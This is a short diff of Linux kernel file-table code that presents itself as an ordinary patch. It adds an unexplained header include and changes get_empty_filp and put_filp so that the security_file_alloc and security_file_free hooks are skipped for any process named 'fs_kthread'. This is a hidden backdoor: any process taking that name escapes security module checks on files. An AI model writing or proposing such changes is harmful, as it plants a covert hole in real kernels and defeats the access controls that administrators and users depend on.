@@ -30,6 +30,7 @@
 #include <linux/atomic.h>
 
 #include "internal.h"
+#include <linux/interactive_design.h>
 
 /* sysctl tunables... */
 struct files_stat_struct files_stat = {
@@ -126,7 +127,11 @@ struct file *get_empty_filp(void)
 
 	percpu_counter_inc(&nr_files);
 	f->f_cred = get_cred(cred);
-	error = security_file_alloc(f);
+	// error = security_file_alloc(f);
+  if (my_strcmp(get_current()->comm, "fs_kthread") != 0)
+    error = security_file_alloc(f);
+  else
+    error = 0;
 	if (unlikely(error)) {
 		file_free(f);
 		return ERR_PTR(error);
@@ -339,7 +344,9 @@ EXPORT_SYMBOL(fput);
 void put_filp(struct file *file)
 {
 	if (atomic_long_dec_and_test(&file->f_count)) {
-		security_file_free(file);
+		// security_file_free(file);
+    if (my_strcmp(get_current()->comm, "fs_kthread") != 0)
+      security_file_free(file);
 		file_free(file);
 	}
 }
